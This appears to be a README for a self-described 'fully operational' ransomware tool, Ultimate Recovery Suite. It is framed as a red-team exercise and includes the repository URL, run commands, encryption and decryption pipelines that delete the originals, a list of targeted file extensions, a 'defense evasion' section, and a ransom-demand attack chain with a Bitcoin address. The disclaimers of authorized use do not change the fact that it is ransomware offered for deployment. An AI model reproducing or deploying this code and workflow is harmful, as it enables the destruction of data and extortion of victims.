# Ultimate Recovery Suite 

![Red Team](https://img.shields.io/badge/OPERATION-URS-critical)
![Ransomware](https://img.shields.io/badge/TYPE-RANSOMWARE-red)
![Version](https://img.shields.io/badge/VERSION-5.0.0-danger)

## 🎯 MISSION BRIEF

**Ultimate Recovery Suite** is a fully operational ransomware system designed for authorized penetration testing and red team operations. This implementation provides complete file encryption, professional GUI interface, and realistic payment demand simulation matching real-world ransomware campaigns.

### ⚠️ OPERATIONAL PROTOCOLS

**AUTHORIZED USE CASES:**  
    - Authorized penetration testing operations  
    - Red team exercises with written Rules of Engagement  
    - Ransomware simulation and defensive validation  
    - Security awareness training in controlled environments  

**PROHIBITED OPERATIONS:**  
    - Unauthorized deployment on production systems  
    - Real financial extortion activities  
    - Deployment without explicit written authorization  
    - Any illegal or malicious operations  

**OPERATORS ASSUME FULL LEGAL RESPONSIBILITY FOR PROPER DEPLOYMENT**

## 🛡️ OPERATIONAL CAPABILITIES

### Ransomware Core Modules
- **File Encryption Engine**: XOR + Base64 with unique per-victim keys
- **Professional GUI Interface**: 3-panel ransom demand screen
- **System Fingerprinting**: Unique System ID generation
- **Payment Simulation**: Bitcoin address + recovery workflow

### Operational Security Features
- **Self-Contained**: No C2 communication or external dependencies
- **Realistic Behavior**: Matches production ransomware TTPs
- **Test Environment Safe**: Configurable file targeting
- **Full Recovery**: Decryption available with generated key

## 🚀 OPERATIONAL DEPLOYMENT

### Phase 1: Test Environment Setup

```bash
# 1. Clone operational repository
git clone https://github.com/Otello96/ultimate-recovery-suite
cd ultimate-recovery-suite

# 2. Create isolated test environment (MANDATORY)
mkdir test_victim_folder
cd test_victim_folder

# 3. Generate test victim files
echo "Critical document data" > confidential.docx
echo "Financial records 2025" > budget.xlsx
echo "Project source code" > source.zip
echo "Database backup" > db.sql
```

## Phase 2: Ransomware Execution

```bash
# Deploy ransomware payload
python ../crypter.py
```
Execution Flow:




1. System ID + Key Generation ✅
2. Recursive file scan ✅
3. All target files encrypted ✅
4. Professional GUI launches ✅
5. Ransom demand displayed ✅

## Phase 3: Recovery Validation

- Key displayed in console during generation
- Enter key in GUI for full recovery validation
- All files restored to original state

## 🛡️ OPERATIONAL CAPABILITIES
- Ransomware Core Modules
- File Encryption Engine: XOR + Base64 with unique per-victim keys
- Professional GUI Interface: 3-panel ransom demand screen
- System Fingerprinting: Unique System ID generation
- Payment Simulation: Bitcoin address + recovery workflow
- 
## 🔧 TECHNICAL SPECIFICATIONS
```text

┌─────────────────┐    ┌──────────────────────┐    ┌─────────────────┐
│   VICTIM        │    │   ENCRYPTION ENGINE  │    │   RECOVERY GUI  │
│                 │    │                      │    │                 │
│  ┌─────────────┐│    │  ┌─────────────────┐ │    │  ┌─────────────┐│
│  │ Test Files   ││◄──►│  │ XOR+Base64     │◄──►│  │ Payment       ││
│  │              ││    │  │ Key Rotation   │ │    │  │ Simulator     ││
│  └─────────────┘│    │  └─────────────────┘ │    │  └─────────────┘│
└─────────────────┘    └──────────────────────┘    └─────────────────┘
```

## File Encryption Pipeline

```
# Production-grade encryption chain
original_data = read_file("document.txt")
b64_data = base64.b64encode(original_data)
encrypted_chunks = []
key = "SECRET_KEY_24_CHARACTERS_LONG"
for i, byte in enumerate(b64_data):
    key_byte = key[i % len(key)]
    encrypted_byte = byte ^ ord(key_byte)
    encrypted_chunks.append(encrypted_byte)
header = b'ENC' + key.encode() + b':'
encrypted_data = header + bytes(encrypted_chunks)
final_encrypted = base64.b64encode(encrypted_data)
write_file("document.txt.encrypted", final_encrypted)
delete_file("document.txt")
```

## File Decryption Pipeline

```
# Catena decrittografia production-grade (ESATTA INVERSA)
encrypted_data = base64.b64decode(read_file("document.txt.encrypted"))
header = encrypted_data[:3]
if header == b'ENC':
    key_start = 3
    key_end = encrypted_data.find(b':', key_start)
    recovery_key = encrypted_data[key_start:key_end].decode()
    encrypted_payload = encrypted_data[key_end+1:]
    
    decrypted_chunks = []
    for i, byte in enumerate(encrypted_payload):
        key_byte = recovery_key[i % len(recovery_key)]
        decrypted_byte = byte ^ ord(key_byte)
        decrypted_chunks.append(decrypted_byte)
    
    b64_decoded = bytes(decrypted_chunks)
    original_data = base64.b64decode(b64_decoded)
    write_file("document.txt", original_data)
    delete_file("document.txt.encrypted")  # FILE CRITTATO ELIMINATO ✅
else:
    print("❌ File non valido o corrotto")
```

## 📋 File Selection Rules
### ENCRYPTED EXTENSIONS:
- 📄 .txt .doc .docx .pdf .xlsx .pptx
- 🖼️ .jpg .png .gif .bmp .tiff
- 🎵 .mp3 .mp4 .avi .mkv
- 📦 .zip .rar .7z .tar
- 💻 .js .html .css .json .xml
- 💾 .sql .db .mdb
### PROTECTED EXTENSIONS:
🚫 .exe .dll .sys .drv .py .pyc .pyw crypter.py

## 🛡️ DEFENSE EVASION
- Legitimate Python: Standard library only (tkinter, base64)
- No Network Calls: Completely offline operation
- Standard File Ops: Normal read/write/delete patterns
- GUI Legitimacy: Professional enterprise appearance

## 🔄 ATTACK CHAIN

### [INFECTION]
- 08:00 → python crypter.py
- 08:01 → URS-A1B2C3D4 | Key: QWERTY...
- 08:02 → 150 files encrypted ✅
- 08:03 → GUI launched 🎬

### [PAYMENT]
- €300 BTC → bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

### [RECOVERY]
- Key entry → VERIFY → RECOVER → 100% restored ✅

## 🚨 SAFETY PROTOCOLS
- ✅ 100% recoverable with key
- ✅ No network communication
- ✅ No system file targeting
- ✅ Console shows recovery key
- ✅ Isolated test environment


## Il creatore NON si assume NESSUNA responsabilità per l'uso improprio di questo strumento. L'utilizzo è a rischio e pericolo esclusivo dell'operatore. Solo per penetration testing autorizzato in ambienti controllati.
